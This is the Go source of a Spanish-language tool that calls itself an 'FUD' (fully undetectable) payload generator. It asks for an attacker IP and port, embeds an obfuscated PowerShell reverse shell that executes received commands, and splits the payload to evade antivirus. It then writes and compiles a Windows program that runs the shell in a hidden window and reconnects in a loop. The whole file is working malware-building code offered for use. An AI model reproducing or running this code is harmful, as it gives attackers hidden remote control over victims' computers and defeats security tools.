package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
)

var name string
var dir string

func main() {

	Execute("clear")
	ex, _ := os.Executable()
	Env := os.Getenv("TEMP")
	end := strings.HasPrefix(ex, Env)
	if end {
		temp, _ := os.Getwd()
		dir = temp 
	} else {
		dir = ex 
	}

	var ip string
	var port string
	var session string

	color.Blue("Generador de Payloads FUD by Black$hell256" + "\n\n")

	red := color.New(color.FgRed).PrintfFunc()

	for {
		red("Ingresa ip: ")
		fmt.Scan(&ip)
		check := strings.ContainsAny(ip, ".")
		if check {
			break
		} else {
			color.Red("\n\n[!] Error : Ip invalida")
			time.Sleep(2 * time.Second)
			Execute("clear")
			color.Blue("Generador de Payloads FUD by AnibalTlgram" + "\n\n")
		}
	}

	for {
		red("Ingresa puerto: ")
		fmt.Scan(&port)
		_, err := strconv.Atoi(port)
		if err == nil {
			port = port
			break
		}
		color.Red("\n\n[!] Error : Puerto invalido")
		time.Sleep(2 * time.Second)
		Execute("clear")
		color.Blue("Generador de Payloads FUD by AnibalTlgram" + "\n\n")

	}

	red("Ingresa nombre del archivo: ")
	fmt.Scan(&name)

	for {
		red("Ingresa tiempo de reconexion: ")
		fmt.Scan(&session)
		_, err := strconv.Atoi(session)
		if err == nil {
			break
		}
		color.Red("\n\n[!] Error : Tiempo invalido")
		time.Sleep(2 * time.Second)
		Execute("clear")
		color.Blue("Generador de Payloads FUD by AnibalTlgram" + "\n\n")

	}

	Payload := `$x = 'UwBvAGM'; $xd = 'AawBlA'; $client = New-Object System.Net.$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(('{0}{1}HQAcwA=' -f $x, $xd)))).TCPClient("` + ip + `" ,` + port + `);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = ('{0}PS ' -f $sb) + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes(('{0}') -f $sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};('{0}.Close()' -f $client)`
	Random := String(20)
	var a []string
	for _, va := range Random {

		c := fmt.Sprintf("(?:(?:%s))", va)
		a = append(a, c)

	}

	Join := strings.Join(a, "|")
	re := regexp.MustCompile(Join)
	Split := Split(re, Payload, -1)
	var e []string

	for _, pe := range Split {

		a := fmt.Sprintln("\t" + "code += `" + pe + "`")
		e = append(e, a)
	}

	delimiters := strings.Join(e, "")

	data := []byte("package main\n\nimport (\n\t" + `"os/exec"` +
		"\n\t" + `"syscall"` + "\n\t" + `"time"` + "\n)\n\n" +
		"func main() {\n\n\t" + `code := ""` + "\n" + delimiters +
		"\n\tfor {\n\t\t" + `cmd := exec.Command("powershell", "-c", code)` + "\n\t\t" +
		`cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}` + "\n\t\tcmd.Run()" +
		"\n\t\ttime.Sleep(" + session + "* time.Second)\n\t" + "}\n" + "}")

	err := ioutil.WriteFile(name+".go", data, 0644)
	if err != nil {
		log.Fatalf("%v", err)
	}

	color.Blue("\nCompilando archivo go..")
	Execute("comp")

}

func Execute(command string) {
	var output []byte
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		file := dir + "\\" + name + ".go"
		if command == "comp" {
			command = `go build -ldflags "-H windowsgui -s -w" `+ file
		}
		fmt.Println(command)
		cmd = exec.Command("powershell", "-c", command)
	default:
		if command == "comp" {
			file := dir + "/" + name + ".go"
			command = string(`GOOS=windows GOARCH=amd64 go build -ldflags "-H windowsgui -s -w" ` + file)
		}
		cmd = exec.Command("sh", "-c", command)
	}

	output, _ = cmd.Output()
	fmt.Println(string(output))
}

func Split(re *regexp.Regexp, s string, n int) []string {
	if n == 0 {
		return nil
	}

	matches := re.FindAllStringIndex(s, n)
	strings := make([]string, 0, len(matches))

	beg := 0
	end := 0
	for _, match := range matches {
		if n > 0 && len(strings) >= n-1 {
			break
		}

		end = match[0]
		if match[1] != 0 {
			strings = append(strings, s[beg:end])
		}
		beg = match[1]
		strings = append(strings, s[match[0]:match[1]])
	}

	if end != len(s) {
		strings = append(strings, s[beg:])
	}

	return strings
}

func Int(min, max int) int {
	return min + rand.Intn(max-min)
}

func String(len int) []string {
	var e []string

	rand.Seed(time.Now().UnixNano())
	bytes := make([]byte, len)
	for i := range bytes {
		bytes[i] = byte(Int(65, 90))
	}

	for _, a := range string(bytes) {
		e = append(e, string(a))

	}
	return e

}
